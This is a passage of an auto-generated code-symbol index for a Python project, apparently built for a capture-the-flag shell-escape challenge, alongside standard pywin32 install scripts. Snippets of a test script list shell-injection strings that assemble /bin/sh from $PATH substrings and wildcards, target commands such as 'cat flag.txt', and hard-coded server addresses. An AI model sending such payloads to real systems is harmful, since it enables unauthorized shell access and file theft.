        "detail": ".history.test_server_response_20250517145959",
        "documentation": {}
    },
    {
        "label": "server_ip",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145959",
        "description": ".history.test_server_response_20250517145959",
        "peekOfCode": "server_ip = \"\" # Placeholder\nserver_port = 0 # Placeholder\ndef send_command(command):\n    \"\"\"Sends a command to the server using a socket and returns the response.\"\"\"\n    print(f\"Sending command: {command}\")\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((server_ip, server_port))\n            s.sendall(command.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes",
        "detail": ".history.test_server_response_20250517145959",
        "documentation": {}
    },
    {
        "label": "server_port",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145959",
        "description": ".history.test_server_response_20250517145959",
        "peekOfCode": "server_port = 0 # Placeholder\ndef send_command(command):\n    \"\"\"Sends a command to the server using a socket and returns the response.\"\"\"\n    print(f\"Sending command: {command}\")\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((server_ip, server_port))\n            s.sendall(command.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes\n            print(f\"Received response:\")",
        "detail": ".history.test_server_response_20250517145959",
        "documentation": {}
    },
    {
        "label": "send_command",
        "kind": 2,
        "importPath": ".history.test_server_response_20250517150009",
        "description": ".history.test_server_response_20250517150009",
        "peekOfCode": "def send_command(command):\n    \"\"\"Sends a command to the server using a socket and returns the response.\"\"\"\n    print(f\"Sending command: {command}\")\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((server_ip, server_port))\n            s.sendall(command.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes\n            print(f\"Received response:\")\n            print(response.decode())",
        "detail": ".history.test_server_response_20250517150009",
        "documentation": {}
    },
    {
        "label": "available_chars",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150009",
        "description": ".history.test_server_response_20250517150009",
        "peekOfCode": "available_chars = \"0123456789${}/?\\\"[:space:]:&>_=()\"\n# Attack Vectors and Target Commands from attack-plan.md\nattack_vectors = [\n    \"${PATH:0:1}\",  # Extract first character of PATH\n    \"$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})\", # Attempt to construct /bin/sh\n    \"$?\", # Exit status\n    \"$$\", # Process ID\n    \"$(/?/?/???)\", # Wildcard usage\n    \"$PATH\",\n    \"$HOME\",",
        "detail": ".history.test_server_response_20250517150009",
        "documentation": {}
    },
    {
        "label": "attack_vectors",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150009",
        "description": ".history.test_server_response_20250517150009",
        "peekOfCode": "attack_vectors = [\n    \"${PATH:0:1}\",  # Extract first character of PATH\n    \"$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})\", # Attempt to construct /bin/sh\n    \"$?\", # Exit status\n    \"$$\", # Process ID\n    \"$(/?/?/???)\", # Wildcard usage\n    \"$PATH\",\n    \"$HOME\",\n    \"$USER\",\n    \"$SHELL\",",
        "detail": ".history.test_server_response_20250517150009",
        "documentation": {}
    },
    {
        "label": "target_commands",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150009",
        "description": ".history.test_server_response_20250517150009",
        "peekOfCode": "target_commands = [\n    \"/bin/sh\",\n    \"/bin/bash\",\n    \"ls\",\n    \"/bin/ls\",\n    \"cat flag.txt\",\n    \"/bin/cat flag*\",\n]\n# TODO: Get server IP and port from user\nserver_ip = \"83.136.252.13\"",
        "detail": ".history.test_server_response_20250517150009",
        "documentation": {}
    },
    {
        "label": "server_ip",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150009",
        "description": ".history.test_server_response_20250517150009",
        "peekOfCode": "server_ip = \"83.136.252.13\"\nserver_port = 39615\ndef send_command(command):\n    \"\"\"Sends a command to the server using a socket and returns the response.\"\"\"\n    print(f\"Sending command: {command}\")\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((server_ip, server_port))\n            s.sendall(command.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes",
        "detail": ".history.test_server_response_20250517150009",
        "documentation": {}
    },
    {
        "label": "server_port",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150009",
        "description": ".history.test_server_response_20250517150009",
        "peekOfCode": "server_port = 39615\ndef send_command(command):\n    \"\"\"Sends a command to the server using a socket and returns the response.\"\"\"\n    print(f\"Sending command: {command}\")\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((server_ip, server_port))\n            s.sendall(command.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes\n            print(f\"Received response:\")",
        "detail": ".history.test_server_response_20250517150009",
        "documentation": {}
    },
    {
        "label": "send_command",
        "kind": 2,
        "importPath": ".history.test_server_response_20250517150619",
        "description": ".history.test_server_response_20250517150619",
        "peekOfCode": "def send_command(command):\n    \"\"\"Sends a command to the server using a socket and returns the response.\"\"\"\n    print(f\"Sending command: {command}\")\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((server_ip, server_port))\n            s.sendall(command.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes\n            print(f\"Received response:\")\n            print(response.decode())",
        "detail": ".history.test_server_response_20250517150619",
        "documentation": {}
    },
    {
        "label": "available_chars",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150619",
        "description": ".history.test_server_response_20250517150619",
        "peekOfCode": "available_chars = \"0123456789${}/?\\\"[:space:]:&>_=()\"\n# Attack Vectors and Target Commands from attack-plan.md\nattack_vectors = [\n    \"${PATH:0:1}\",  # Extract first character of PATH\n    \"$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})\", # Attempt to construct /bin/sh\n    \"$?\", # Exit status\n    \"$$\", # Process ID\n    \"$(/?/?/???)\", # Wildcard usage\n    \"$PATH\",\n    \"$HOME\",",
        "detail": ".history.test_server_response_20250517150619",
        "documentation": {}
    },
    {
        "label": "attack_vectors",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150619",
        "description": ".history.test_server_response_20250517150619",
        "peekOfCode": "attack_vectors = [\n    \"${PATH:0:1}\",  # Extract first character of PATH\n    \"$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})\", # Attempt to construct /bin/sh\n    \"$?\", # Exit status\n    \"$$\", # Process ID\n    \"$(/?/?/???)\", # Wildcard usage\n    \"$PATH\",\n    \"$HOME\",\n    \"$USER\",\n    \"$SHELL\",",
        "detail": ".history.test_server_response_20250517150619",
        "documentation": {}
    },
    {
        "label": "target_commands",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150619",
        "description": ".history.test_server_response_20250517150619",
        "peekOfCode": "target_commands = [\n    \"/bin/sh\",\n    \"/bin/bash\",\n    \"ls\",\n    \"/bin/ls\",\n    \"cat flag.txt\",\n    \"/bin/cat flag*\",\n]\n# TODO: Get server IP and port from user\nserver_ip = \"94.237.123.87\"",
        "detail": ".history.test_server_response_20250517150619",
        "documentation": {}
    },
    {
        "label": "server_ip",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150619",
        "description": ".history.test_server_response_20250517150619",
        "peekOfCode": "server_ip = \"94.237.123.87\"\nserver_port = 44123\ndef send_command(command):\n    \"\"\"Sends a command to the server using a socket and returns the response.\"\"\"\n    print(f\"Sending command: {command}\")\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((server_ip, server_port))\n            s.sendall(command.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes",
        "detail": ".history.test_server_response_20250517150619",
        "documentation": {}
    },
    {
        "label": "server_port",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517150619",
        "description": ".history.test_server_response_20250517150619",
        "peekOfCode": "server_port = 44123\ndef send_command(command):\n    \"\"\"Sends a command to the server using a socket and returns the response.\"\"\"\n    print(f\"Sending command: {command}\")\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((server_ip, server_port))\n            s.sendall(command.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes\n            print(f\"Received response:\")",
        "detail": ".history.test_server_response_20250517150619",
        "documentation": {}
    },
    {
        "label": "bin_dir",
        "kind": 5,
        "importPath": ".venv.Scripts.activate_this",
        "description": ".venv.Scripts.activate_this",
        "peekOfCode": "bin_dir = os.path.dirname(abs_file)\nbase = bin_dir[: -len(\"Scripts\") - 1]  # strip away the bin part from the __file__, plus the path separator\n# prepend bin to PATH (this file is inside the bin directory)\nos.environ[\"PATH\"] = os.pathsep.join([bin_dir, *os.environ.get(\"PATH\", \"\").split(os.pathsep)])\nos.environ[\"VIRTUAL_ENV\"] = base  # virtual env is right above bin directory\nos.environ[\"VIRTUAL_ENV_PROMPT\"] = \"SandboxEscape\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))",
        "detail": ".venv.Scripts.activate_this",
        "documentation": {}
    },
    {
        "label": "base",
        "kind": 5,
        "importPath": ".venv.Scripts.activate_this",
        "description": ".venv.Scripts.activate_this",
        "peekOfCode": "base = bin_dir[: -len(\"Scripts\") - 1]  # strip away the bin part from the __file__, plus the path separator\n# prepend bin to PATH (this file is inside the bin directory)\nos.environ[\"PATH\"] = os.pathsep.join([bin_dir, *os.environ.get(\"PATH\", \"\").split(os.pathsep)])\nos.environ[\"VIRTUAL_ENV\"] = base  # virtual env is right above bin directory\nos.environ[\"VIRTUAL_ENV_PROMPT\"] = \"SandboxEscape\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path)",
        "detail": ".venv.Scripts.activate_this",
        "documentation": {}
    },
    {
        "label": "os.environ[\"PATH\"]",
        "kind": 5,
        "importPath": ".venv.Scripts.activate_this",
        "description": ".venv.Scripts.activate_this",
        "peekOfCode": "os.environ[\"PATH\"] = os.pathsep.join([bin_dir, *os.environ.get(\"PATH\", \"\").split(os.pathsep)])\nos.environ[\"VIRTUAL_ENV\"] = base  # virtual env is right above bin directory\nos.environ[\"VIRTUAL_ENV_PROMPT\"] = \"SandboxEscape\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path)\nsys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix",
        "detail": ".venv.Scripts.activate_this",
        "documentation": {}
    },
    {
        "label": "os.environ[\"VIRTUAL_ENV\"]",
        "kind": 5,
        "importPath": ".venv.Scripts.activate_this",
        "description": ".venv.Scripts.activate_this",
        "peekOfCode": "os.environ[\"VIRTUAL_ENV\"] = base  # virtual env is right above bin directory\nos.environ[\"VIRTUAL_ENV_PROMPT\"] = \"SandboxEscape\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path)\nsys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix\nsys.prefix = base",
        "detail": ".venv.Scripts.activate_this",
        "documentation": {}
    },
    {
        "label": "os.environ[\"VIRTUAL_ENV_PROMPT\"]",
        "kind": 5,
        "importPath": ".venv.Scripts.activate_this",
        "description": ".venv.Scripts.activate_this",
        "peekOfCode": "os.environ[\"VIRTUAL_ENV_PROMPT\"] = \"SandboxEscape\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path)\nsys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix\nsys.prefix = base",
        "detail": ".venv.Scripts.activate_this",
        "documentation": {}
    },
    {
        "label": "prev_length",
        "kind": 5,
        "importPath": ".venv.Scripts.activate_this",
        "description": ".venv.Scripts.activate_this",
        "peekOfCode": "prev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path)\nsys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix\nsys.prefix = base",
        "detail": ".venv.Scripts.activate_this",
        "documentation": {}
    },
    {
        "label": "sys.path[:]",
        "kind": 5,
        "importPath": ".venv.Scripts.activate_this",
        "description": ".venv.Scripts.activate_this",
        "peekOfCode": "sys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix\nsys.prefix = base",
        "detail": ".venv.Scripts.activate_this",
        "documentation": {}
    },
    {
        "label": "sys.real_prefix",
        "kind": 5,
        "importPath": ".venv.Scripts.activate_this",
        "description": ".venv.Scripts.activate_this",
        "peekOfCode": "sys.real_prefix = sys.prefix\nsys.prefix = base",
        "detail": ".venv.Scripts.activate_this",
        "documentation": {}
    },
    {
        "label": "sys.prefix",
        "kind": 5,
        "importPath": ".venv.Scripts.activate_this",
        "description": ".venv.Scripts.activate_this",
        "peekOfCode": "sys.prefix = base",
        "detail": ".venv.Scripts.activate_this",
        "documentation": {}
    },
    {
        "label": "Tee",
        "kind": 6,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "class Tee:\n    def __init__(self, file):\n        self.f = file\n    def write(self, what):\n        if self.f is not None:\n            try:\n                self.f.write(what.replace(\"\\n\", \"\\r\\n\"))\n            except OSError:\n                pass\n        tee_f.write(what)",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "get_root_hkey",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def get_root_hkey():\n    try:\n        winreg.OpenKey(\n            winreg.HKEY_LOCAL_MACHINE, root_key_name, 0, winreg.KEY_CREATE_SUB_KEY\n        )\n        return winreg.HKEY_LOCAL_MACHINE\n    except OSError:\n        # Either not exist, or no permissions to create subkey means\n        # must be HKCU\n        return winreg.HKEY_CURRENT_USER",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "create_shortcut",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def create_shortcut(\n    path, description, filename, arguments=\"\", workdir=\"\", iconpath=\"\", iconindex=0\n):\n    import pythoncom\n    from win32com.shell import shell\n    ilink = pythoncom.CoCreateInstance(\n        shell.CLSID_ShellLink,\n        None,\n        pythoncom.CLSCTX_INPROC_SERVER,\n        shell.IID_IShellLink,",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "get_special_folder_path",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def get_special_folder_path(path_name):\n    from win32com.shell import shell, shellcon\n    for maybe in \"\"\"\n        CSIDL_COMMON_STARTMENU CSIDL_STARTMENU CSIDL_COMMON_APPDATA\n        CSIDL_LOCAL_APPDATA CSIDL_APPDATA CSIDL_COMMON_DESKTOPDIRECTORY\n        CSIDL_DESKTOPDIRECTORY CSIDL_COMMON_STARTUP CSIDL_STARTUP\n        CSIDL_COMMON_PROGRAMS CSIDL_PROGRAMS CSIDL_PROGRAM_FILES_COMMON\n        CSIDL_PROGRAM_FILES CSIDL_FONTS\"\"\".split():\n        if maybe == path_name:\n            csidl = getattr(shellcon, maybe)",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "CopyTo",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def CopyTo(desc, src, dest):\n    import win32api\n    import win32con\n    while 1:\n        try:\n            win32api.CopyFile(src, dest, 0)\n            return\n        except win32api.error as details:\n            if details.winerror == 5:  # access denied - user not admin.\n                raise",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "LoadSystemModule",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def LoadSystemModule(lib_dir, modname):\n    # See if this is a debug build.\n    import importlib.machinery\n    import importlib.util\n    suffix = \"_d\" if \"_d.pyd\" in importlib.machinery.EXTENSION_SUFFIXES else \"\"\n    filename = \"%s%d%d%s.dll\" % (\n        modname,\n        sys.version_info.major,\n        sys.version_info.minor,\n        suffix,",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "SetPyKeyVal",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def SetPyKeyVal(key_name, value_name, value):\n    root_hkey = get_root_hkey()\n    root_key = winreg.OpenKey(root_hkey, root_key_name)\n    try:\n        my_key = winreg.CreateKey(root_key, key_name)\n        try:\n            winreg.SetValueEx(my_key, value_name, 0, winreg.REG_SZ, value)\n            if verbose:\n                print(f\"-> {root_key_name}\\\\{key_name}[{value_name}]={value!r}\")\n        finally:",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "UnsetPyKeyVal",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def UnsetPyKeyVal(key_name, value_name, delete_key=False):\n    root_hkey = get_root_hkey()\n    root_key = winreg.OpenKey(root_hkey, root_key_name)\n    try:\n        my_key = winreg.OpenKey(root_key, key_name, 0, winreg.KEY_SET_VALUE)\n        try:\n            winreg.DeleteValue(my_key, value_name)\n            if verbose:\n                print(f\"-> DELETE {root_key_name}\\\\{key_name}[{value_name}]\")\n        finally:",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "RegisterCOMObjects",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def RegisterCOMObjects(register=True):\n    import win32com.server.register\n    if register:\n        func = win32com.server.register.RegisterClasses\n    else:\n        func = win32com.server.register.UnregisterClasses\n    flags = {}\n    if not verbose:\n        flags[\"quiet\"] = 1\n    for module, klass_name in com_modules:",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "RegisterHelpFile",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def RegisterHelpFile(register=True, lib_dir=None):\n    if lib_dir is None:\n        lib_dir = sysconfig.get_paths()[\"platlib\"]\n    if register:\n        # Register the .chm help file.\n        chm_file = os.path.join(lib_dir, \"PyWin32.chm\")\n        if os.path.isfile(chm_file):\n            # This isn't recursive, so if 'Help' doesn't exist, we croak\n            SetPyKeyVal(\"Help\", None, None)\n            SetPyKeyVal(\"Help\\\\Pythonwin Reference\", None, chm_file)",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "RegisterPythonwin",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def RegisterPythonwin(register=True, lib_dir=None):\n    \"\"\"Add (or remove) Pythonwin to context menu for python scripts.\n    ??? Should probably also add Edit command for pys files also.\n    Also need to remove these keys on uninstall, but there's no function\n    to add registry entries to uninstall log ???\n    \"\"\"\n    import os\n    if lib_dir is None:\n        lib_dir = sysconfig.get_paths()[\"platlib\"]\n    classes_root = get_root_hkey()",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "get_shortcuts_folder",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def get_shortcuts_folder():\n    if get_root_hkey() == winreg.HKEY_LOCAL_MACHINE:\n        try:\n            fldr = get_special_folder_path(\"CSIDL_COMMON_PROGRAMS\")\n        except OSError:\n            # No CSIDL_COMMON_PROGRAMS on this platform\n            fldr = get_special_folder_path(\"CSIDL_PROGRAMS\")\n    else:\n        # non-admin install - always goes in this user's start menu.\n        fldr = get_special_folder_path(\"CSIDL_PROGRAMS\")",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "get_system_dir",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def get_system_dir():\n    import win32api  # we assume this exists.\n    try:\n        import pythoncom\n        import win32process\n        from win32com.shell import shell, shellcon\n        try:\n            if win32process.IsWow64Process():\n                return shell.SHGetSpecialFolderPath(0, shellcon.CSIDL_SYSTEMX86)\n            return shell.SHGetSpecialFolderPath(0, shellcon.CSIDL_SYSTEM)",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "fixup_dbi",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def fixup_dbi():\n    # We used to have a dbi.pyd with our .pyd files, but now have a .py file.\n    # If the user didn't uninstall, they will find the .pyd which will cause\n    # problems - so handle that.\n    import win32api\n    import win32con\n    pyd_name = os.path.join(os.path.dirname(win32api.__file__), \"dbi.pyd\")\n    pyd_d_name = os.path.join(os.path.dirname(win32api.__file__), \"dbi_d.pyd\")\n    py_name = os.path.join(os.path.dirname(win32con.__file__), \"dbi.py\")\n    for this_pyd in (pyd_name, pyd_d_name):",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "install",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def install(lib_dir):\n    import traceback\n    # The .pth file is now installed as a regular file.\n    # Create the .pth file in the site-packages dir, and use only relative paths\n    # We used to write a .pth directly to sys.prefix - clobber it.\n    if os.path.isfile(os.path.join(sys.prefix, \"pywin32.pth\")):\n        os.unlink(os.path.join(sys.prefix, \"pywin32.pth\"))\n    # The .pth may be new and therefore not loaded in this session.\n    # Setup the paths just in case.\n    for name in \"win32 win32\\\\lib Pythonwin\".split():",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "uninstall",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def uninstall(lib_dir):\n    # First ensure our system modules are loaded from pywin32_system, so\n    # we can remove the ones we copied...\n    LoadSystemModule(lib_dir, \"pywintypes\")\n    LoadSystemModule(lib_dir, \"pythoncom\")\n    try:\n        RegisterCOMObjects(False)\n    except Exception as why:\n        print(f\"Failed to unregister COM objects: {why}\")\n    try:",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "verify_destination",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def verify_destination(location: str) -> str:\n    location = os.path.abspath(location)\n    if not os.path.isdir(location):\n        raise argparse.ArgumentTypeError(\n            f'Path \"{location}\" is not an existing directory!'\n        )\n    return location\ndef main():\n    parser = argparse.ArgumentParser(\n        formatter_class=argparse.RawDescriptionHelpFormatter,",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "def main():\n    parser = argparse.ArgumentParser(\n        formatter_class=argparse.RawDescriptionHelpFormatter,\n        description=\"\"\"A post-install script for the pywin32 extensions.\n    * Typical usage:\n    > python -m pywin32_postinstall -install\n    * or (shorter but you don't have control over which python environment is used)\n    > pywin32_postinstall -install\n    You need to execute this script, with a '-install' parameter,\n    to ensure the environment is setup correctly to install COM objects, services, etc.",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "tee_f",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "tee_f = open(\n    os.path.join(\n        tempfile.gettempdir(),  # Send output somewhere so it can be found if necessary...\n        \"pywin32_postinstall.log\",\n    ),\n    \"w\",\n)\nclass Tee:\n    def __init__(self, file):\n        self.f = file",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "sys.stderr",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "sys.stderr = Tee(sys.stderr)\nsys.stdout = Tee(sys.stdout)\ncom_modules = [\n    # module_name,                      class_names\n    (\"win32com.servers.interp\", \"Interpreter\"),\n    (\"win32com.servers.dictionary\", \"DictionaryPolicy\"),\n    (\"win32com.axscript.client.pyscript\", \"PyScript\"),\n]\n# Is this a 'silent' install - ie, avoid all dialogs.\n# Different than 'verbose'",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "sys.stdout",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "sys.stdout = Tee(sys.stdout)\ncom_modules = [\n    # module_name,                      class_names\n    (\"win32com.servers.interp\", \"Interpreter\"),\n    (\"win32com.servers.dictionary\", \"DictionaryPolicy\"),\n    (\"win32com.axscript.client.pyscript\", \"PyScript\"),\n]\n# Is this a 'silent' install - ie, avoid all dialogs.\n# Different than 'verbose'\nsilent = 0",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "com_modules",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "com_modules = [\n    # module_name,                      class_names\n    (\"win32com.servers.interp\", \"Interpreter\"),\n    (\"win32com.servers.dictionary\", \"DictionaryPolicy\"),\n    (\"win32com.axscript.client.pyscript\", \"PyScript\"),\n]\n# Is this a 'silent' install - ie, avoid all dialogs.\n# Different than 'verbose'\nsilent = 0\n# Verbosity of output messages.",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "silent",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "silent = 0\n# Verbosity of output messages.\nverbose = 1\nroot_key_name = \"Software\\\\Python\\\\PythonCore\\\\\" + sys.winver\ndef get_root_hkey():\n    try:\n        winreg.OpenKey(\n            winreg.HKEY_LOCAL_MACHINE, root_key_name, 0, winreg.KEY_CREATE_SUB_KEY\n        )\n        return winreg.HKEY_LOCAL_MACHINE",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "verbose",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "verbose = 1\nroot_key_name = \"Software\\\\Python\\\\PythonCore\\\\\" + sys.winver\ndef get_root_hkey():\n    try:\n        winreg.OpenKey(\n            winreg.HKEY_LOCAL_MACHINE, root_key_name, 0, winreg.KEY_CREATE_SUB_KEY\n        )\n        return winreg.HKEY_LOCAL_MACHINE\n    except OSError:\n        # Either not exist, or no permissions to create subkey means",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "root_key_name",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_postinstall",
        "description": ".venv.Scripts.pywin32_postinstall",
        "peekOfCode": "root_key_name = \"Software\\\\Python\\\\PythonCore\\\\\" + sys.winver\ndef get_root_hkey():\n    try:\n        winreg.OpenKey(\n            winreg.HKEY_LOCAL_MACHINE, root_key_name, 0, winreg.KEY_CREATE_SUB_KEY\n        )\n        return winreg.HKEY_LOCAL_MACHINE\n    except OSError:\n        # Either not exist, or no permissions to create subkey means\n        # must be HKCU",
        "detail": ".venv.Scripts.pywin32_postinstall",
        "documentation": {}
    },
    {
        "label": "run_test",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_testall",
        "description": ".venv.Scripts.pywin32_testall",
        "peekOfCode": "def run_test(script, cmdline_extras):\n    dirname, scriptname = os.path.split(script)\n    # some tests prefer to be run from their directory.\n    cmd = [sys.executable, \"-u\", scriptname] + cmdline_extras\n    print(\"--- Running '%s' ---\" % script)\n    sys.stdout.flush()\n    result = subprocess.run(cmd, check=False, cwd=dirname)\n    print(f\"*** Test script '{script}' exited with {result.returncode}\")\n    sys.stdout.flush()\n    if result.returncode:",
        "detail": ".venv.Scripts.pywin32_testall",
        "documentation": {}
    },
    {
        "label": "find_and_run",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_testall",
